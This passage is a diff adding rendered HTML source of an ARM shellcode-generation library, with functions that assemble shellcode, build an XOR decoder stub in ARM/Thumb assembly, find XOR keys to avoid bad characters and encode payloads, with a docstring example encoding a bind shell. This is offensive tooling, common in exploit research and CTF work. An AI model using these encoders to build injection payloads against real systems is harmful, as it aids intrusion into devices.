+    <span class="sd">&quot;&quot;&quot;Compiles shellcode</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        source (str): shellcode in strings</span>
+
+<span class="sd">        isThumb (boolean): Thumb or ARM Mode</span>
+
+<span class="sd">        isNeedHead (boolean): It shows up if true</span>
+
+
+<span class="sd">    Returns:</span>
+<span class="sd">      compiled shellcode </span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">ASM_HEAD</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    .global _start</span>
+<span class="s">    .section .text</span>
+<span class="s">    _start:</span>
+<span class="s">    &quot;&quot;&quot;</span>
+
+    <span class="n">ASM_THUMB</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    .arm</span>
+<span class="s">    add r6, pc, #1</span>
+<span class="s">    bx r6</span>
+<span class="s">    .thumb</span>
+<span class="s">    &quot;&quot;&quot;</span>
+
+    <span class="n">fn</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span> <span class="c"># binary file</span>
+    <span class="n">fn_s</span> <span class="o">=</span> <span class="n">fn</span> <span class="o">+</span> <span class="s">&#39;.s&#39;</span> <span class="c"># as file</span>
+    <span class="n">fn_o</span> <span class="o">=</span> <span class="n">fn</span> <span class="o">+</span> <span class="s">&#39;.o&#39;</span> <span class="c"># ld file</span>
+    <span class="n">fn_raw</span> <span class="o">=</span> <span class="n">fn</span> <span class="o">+</span> <span class="s">&#39;.raw&#39;</span> <span class="c"># objcopy </span>
+    <span class="n">will_be_deleted</span> <span class="o">=</span> <span class="p">[</span><span class="n">fn</span><span class="p">,</span> <span class="n">fn_s</span><span class="p">,</span> <span class="n">fn_o</span><span class="p">,</span> <span class="n">fn_raw</span><span class="p">]</span>
+
+    <span class="n">src</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">isNeedHead</span><span class="p">:</span>
+        <span class="n">src</span> <span class="o">+=</span> <span class="n">ASM_HEAD</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
+
+    <span class="c">#if isThumb:</span>
+    <span class="c">#    src += ASM_THUMB + &#39;\n&#39;</span>
+
+    <span class="n">src</span> <span class="o">+=</span> <span class="n">source</span>
+    <span class="c"># write a source</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">fn_s</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">src</span><span class="p">)</span>
+
+    <span class="c"># compile a source</span>
+    <span class="k">if</span> <span class="n">isThumb</span><span class="p">:</span>
+        <span class="n">COMPILE</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s"> -o </span><span class="si">%s</span><span class="s"> -mthumb&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">BIN_AS</span><span class="p">,</span> <span class="n">fn_s</span><span class="p">,</span> <span class="n">fn_o</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">COMPILE</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s"> -o </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">BIN_AS</span><span class="p">,</span> <span class="n">fn_s</span><span class="p">,</span> <span class="n">fn_o</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">COMPILE</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">fn_o</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;Failed to compile a source: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn_s</span><span class="p">)</span>
+        <span class="n">cleanup</span><span class="p">(</span><span class="n">will_be_deleted</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="c"># link an object</span>
+    <span class="n">LINKING</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s"> -o </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">BIN_LD</span><span class="p">,</span> <span class="n">fn_o</span><span class="p">,</span> <span class="n">fn</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">LINKING</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">fn_o</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;Failed to link an object: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn_o</span><span class="p">)</span>
+        <span class="n">cleanup</span><span class="p">(</span><span class="n">will_be_deleted</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="c"># objcopy </span>
+    <span class="n">OBJCOPY</span> <span class="o">=</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> -I elf32-little -j .text -O binary </span><span class="si">%s</span><span class="s"> </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">BIN_OC</span><span class="p">,</span> <span class="n">fn</span><span class="p">,</span> <span class="n">fn_raw</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">OBJCOPY</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">fn_raw</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;Failed to make a raw file: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+        <span class="n">cleanup</span><span class="p">(</span><span class="n">will_be_deleted</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">fn_raw</span><span class="p">,</span><span class="s">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">cleanup</span><span class="p">(</span><span class="n">will_be_deleted</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">f</span>
+</div>
+<div class="viewcode-block" id="printHex"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.printHex">[docs]</a><span class="k">def</span> <span class="nf">printHex</span><span class="p">(</span><span class="n">xhex</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;print hex code in human-readable</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        xhex(hex): hex code</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        human-readable hex code like &#39;\\x41&#39;</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">xtmp</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">xhex</span> <span class="o">=</span> <span class="n">xhex</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">xhex</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+        <span class="n">xtmp</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\\</span><span class="s">x&#39;</span> <span class="o">+</span> <span class="n">xhex</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">xtmp</span>
+</div>
+<div class="viewcode-block" id="XOREncoder"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.XOREncoder">[docs]</a><span class="k">def</span> <span class="nf">XOREncoder</span><span class="p">(</span><span class="n">scSize</span><span class="p">,</span> <span class="n">xorkey</span><span class="p">,</span> <span class="n">SC</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;XOR Encoder to avoid some bad codes like ``0x0a``, ``0x00`` and so on</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        scSize(int): shellcode length</span>
+
+<span class="sd">        xorkey(int): XOR key</span>
+
+<span class="sd">        SC(str): shellcode</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        XOR Encoder shellcode in string</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">MAX_SC_SIZE</span> <span class="o">=</span> <span class="mi">256</span>
+    <span class="n">LOOP_SC_SIZE</span> <span class="o">=</span> <span class="n">MAX_SC_SIZE</span> <span class="o">-</span> <span class="n">scSize</span>
+
+    <span class="n">sc</span><span class="o">=</span><span class="s">&quot;&quot;&quot;</span>
+<span class="s">    adr r8, scode</span>
+
+<span class="s">main:</span>
+<span class="s">    mov r4, #</span><span class="si">%s</span><span class="s"></span>
+<span class="s">    adr r6, nanosleep</span>
+
+<span class="s">loop:</span>
+<span class="s">    cmp  r4, #</span><span class="si">%s</span><span class="s"></span>
+<span class="s">    bxhi r6</span>
+<span class="s">    sub  r4, r4, #</span><span class="si">%s</span><span class="s"></span>
+<span class="s">    ldrb r5, [r8, r4]</span>
+<span class="s">    eor  r5, r5, #</span><span class="si">%s</span><span class="s"></span>
+<span class="s">    strb r5, [r8, r4]</span>
+<span class="s">    add  r4, r4, #</span><span class="si">%s</span><span class="s"></span>
+
+<span class="s">backloop:</span>
+<span class="s">    b loop</span>
+<span class="s">backmain:</span>
+<span class="s">    bl main</span>
+
+<span class="s">nanosleep:</span>
+<span class="s">    .arm</span>
+<span class="s">    add r6, pc, #1</span>
+<span class="s">    bx r6</span>
+<span class="s">    .thumb</span>
+<span class="s">nanosleep2:</span>
+<span class="s">    sub r5, r5, r5</span>
+<span class="s">    add r5, r5, #1</span>
+<span class="s">    sub r6, r6, r6</span>
+<span class="s">    push {r5, r6}</span>
+<span class="s">    push {r5, r6}</span>
+<span class="s">    mov r0, sp</span>
+<span class="s">    mov r1, sp</span>
+<span class="s">    mov r7, #162</span>
+<span class="s">    svc 1</span>
+
+<span class="s">scode:</span>
+<span class="s">    .asciz &quot;</span><span class="si">%s</span><span class="s">&quot;</span>
+<span class="s">    &quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">LOOP_SC_SIZE</span><span class="p">,</span> <span class="n">MAX_SC_SIZE</span><span class="p">,</span> <span class="n">LOOP_SC_SIZE</span><span class="p">,</span> <span class="n">xorkey</span><span class="p">,</span> <span class="n">LOOP_SC_SIZE</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">printHex</span><span class="p">(</span><span class="n">SC</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">sc</span>
+</div>
+<div class="viewcode-block" id="findXorKey"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.findXorKey">[docs]</a><span class="k">def</span> <span class="nf">findXorKey</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">bc</span><span class="o">=</span><span class="p">[</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">]):</span>
+    <span class="sd">&quot;&quot;&quot;find XOR key to scramble and to avoid all of bad chars such as ``0x00``</span>
+
+<span class="sd">        Args:</span>
+<span class="sd">            sc(str): shellcode</span>
+
+<span class="sd">            bc(list): bad chars to avoid</span>
+
+<span class="sd">        Returns:</span>
+<span class="sd">            key (int): XOR key</span>
+
+<span class="sd">        Examples:</span>
+<span class="sd">            &gt;&gt;&gt; print findXorKey(sc)</span>
+<span class="sd">            2</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
+    <span class="n">bcs</span>  <span class="o">=</span> <span class="n">bc</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xFF</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">i</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sc</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">in</span> <span class="n">bcs</span><span class="p">:</span>
+                <span class="n">key</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="n">key</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">key</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
+
+</div>
+<div class="viewcode-block" id="encodeShellcode"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.encodeShellcode">[docs]</a><span class="k">def</span> <span class="nf">encodeShellcode</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;encodes shellcode with key to avoid all of bad chars such as ``0x00``</span>
+
+<span class="sd">        Args:</span>
+<span class="sd">            sc(str): shellcode</span>
+<span class="sd">            key(int/str): XOR key</span>
+
+<span class="sd">        Returns:</span>
+<span class="sd">            xoredSC(str): XORed Shellcode</span>
+
+<span class="sd">        Examples:</span>
+<span class="sd">            &gt;&gt;&gt; print encodeShellcode(sc, findXorKey(sc))</span>
+<span class="sd">            &#39;\x0e\x02\x8d\xe0\x02&quot;\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02&#39;</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">xsc</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)):</span>
+        <span class="n">xsc</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="n">sc</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">key</span> <span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">xsc</span>
+</div>
+<div class="viewcode-block" id="checkBadChar"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.checkBadChar">[docs]</a><span class="k">def</span> <span class="nf">checkBadChar</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">bc</span><span class="o">=</span><span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">]):</span>
+    <span class="sd">&quot;&quot;&quot;checks bad chars in shellcode string</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        sc(str): shellcode</span>
+
+<span class="sd">        bc(list): bad chars like ``0x00``, ``0x0a``</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        list if bad chars exists</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
+    <span class="n">bcs</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sc</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">bc</span><span class="p">:</span>
+            <span class="n">bcs</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="n">bcs</span>
+</div>
+<div class="viewcode-block" id="MakeXorShellcode"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.MakeXorShellcode">[docs]</a><span class="k">def</span> <span class="nf">MakeXorShellcode</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">isThumb</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Make XOR Encoder with Shellcode</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        sc(str): shellcode</span>
+
+<span class="sd">        isThumb(boolean): ARM or Thumb Mode</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        shellcode in hex</span>
+
+<span class="sd">    Examples:</span>
+<span class="sd">        &gt;&gt;&gt; sc = MakeXorShellcode(bindshell, isThumb=True)</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">findXorKey</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;Failed to find xor key&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="n">xorsc</span>  <span class="o">=</span> <span class="n">encodeShellcode</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="n">xorenc</span> <span class="o">=</span> <span class="n">XOREncoder</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">xorsc</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="n">xorsc</span><span class="p">)</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="n">checkBadChar</span><span class="p">(</span><span class="n">xorenc</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;!!! Bad char has been found in shellcode. Please check out&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s">&quot;&quot;</span>
+
+    <span class="k">return</span> <span class="n">CompileSC</span><span class="p">(</span><span class="n">xorenc</span><span class="p">,</span> <span class="n">isThumb</span><span class="o">=</span><span class="n">isThumb</span><span class="p">)</span>
+</div>
+<div class="viewcode-block" id="uu16"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.uu16">[docs]</a><span class="k">def</span> <span class="nf">uu16</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;struct.unpack(2-bytes)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        u(str): 2-bytes packed data</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        unsigned short value</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">u</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</div>
+<div class="viewcode-block" id="u16"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.u16">[docs]</a><span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;struct.unpack(2-bytes)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        u(str): 2-bytes packed data</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        short value</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;h&#39;</span><span class="p">,</span> <span class="n">u</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</div>
+<div class="viewcode-block" id="uu32"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.uu32">[docs]</a><span class="k">def</span> <span class="nf">uu32</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;struct.unpack(4-bytes)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        u(str): 4-bytes packed data</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        unsigned integer value</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">u</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</div>
+<div class="viewcode-block" id="u32"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.u32">[docs]</a><span class="k">def</span> <span class="nf">u32</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;struct.unpack(4-bytes)</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        u(str): 4-bytes packed data</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        integer value</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">u</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+</div>
+<div class="viewcode-block" id="getdent_to_list"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.getdent_to_list">[docs]</a><span class="k">def</span> <span class="nf">getdent_to_list</span><span class="p">(</span><span class="n">rv</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;parses getdent&#39;s struct to human readable.</span>
+<span class="sd">    </span>
+<span class="sd">       Args: </span>
+<span class="sd">            rv(str): getdent&#39;s struct included file/directory name(s)</span>
+<span class="sd">            </span>
+<span class="sd">       Returns:</span>
+<span class="sd">            fn(list): file/directory name(s)</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">i</span>  <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">fn</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">inode</span>   <span class="o">=</span> <span class="n">rv</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+            <span class="n">off</span>     <span class="o">=</span> <span class="n">rv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
+            <span class="n">st_size</span> <span class="o">=</span> <span class="n">u16</span><span class="p">(</span><span class="n">rv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">])</span>
+            <span class="n">fname</span>   <span class="o">=</span> <span class="n">rv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">st_size</span><span class="p">]</span>
+
+            <span class="k">if</span> <span class="n">st_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">xfname</span> <span class="o">=</span> <span class="n">fname</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">xfname</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">fn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xfname</span><span class="p">)</span>
+            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">st_size</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">rv</span><span class="p">):</span>
+                <span class="k">break</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">rv</span><span class="p">):</span>
+                <span class="c"># weird but have to exit</span>
+                <span class="k">break</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">fn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;exception&#39;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">fn</span>
+</div>
+<div class="viewcode-block" id="thumb_fixup"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.thumb_fixup">[docs]</a><span class="k">def</span> <span class="nf">thumb_fixup</span><span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;fixes up value for register </span>
+
+<span class="sd">       Args:</span>
+<span class="sd">            reg(str): register</span>
+
+<span class="sd">            value(int): real value</span>
+
+<span class="sd">       Retruns:</span>
+<span class="sd">            fn(str): arranged value with register</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">value</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">mov </span><span class="si">%s</span><span class="s">, #</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+
+    <span class="n">fn</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">fn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">sub </span><span class="si">%s</span><span class="s">, </span><span class="si">%s</span><span class="s">, </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">reg</span><span class="p">))</span>
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">value</span> <span class="o">%</span> <span class="mi">255</span>
+    <span class="n">div</span> <span class="o">=</span> <span class="n">value</span> <span class="o">/</span> <span class="mi">255</span>
+
+    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">div</span><span class="p">):</span>
+        <span class="n">fn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">add </span><span class="si">%s</span><span class="s">, </span><span class="si">%s</span><span class="s">, #255&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">reg</span><span class="p">))</span>
+    <span class="n">fn</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="s">add </span><span class="si">%s</span><span class="s">, </span><span class="si">%s</span><span class="s">, #</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">reg</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">mod</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</div>
+<div class="viewcode-block" id="disasm"><a class="viewcode-back" href="../ARMSCGen.html#ARMSCGen.disasm">[docs]</a><span class="k">def</span> <span class="nf">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">&#39;ARM&#39;</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s">&#39;THUMB&#39;</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;disassembles code in arch with mode</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        code(str): assemble code</span>
+
+<span class="sd">        arch(str): Architechture (so far ARM only)</span>
+
+<span class="sd">        mode(str): Mode (THUMB or ARM)</span>
+
+<span class="sd">    Returns:</span>
+<span class="sd">        result in string</span>
+
+<span class="sd">    Examples:</span>
+<span class="sd">        &gt;&gt;&gt; rv = disasm(code, &#39;ARM&#39;, &#39;THUMB&#39;)</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="k">if</span> <span class="n">g_capstone</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="n">SYSERR</span><span class="p">(</span><span class="s">&quot;so far, there is no capstone module&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">&#39;ARM&#39;</span><span class="p">:</span>
+        <span class="n">xarch</span> <span class="o">=</span> <span class="n">CS_ARCH_ARM</span>
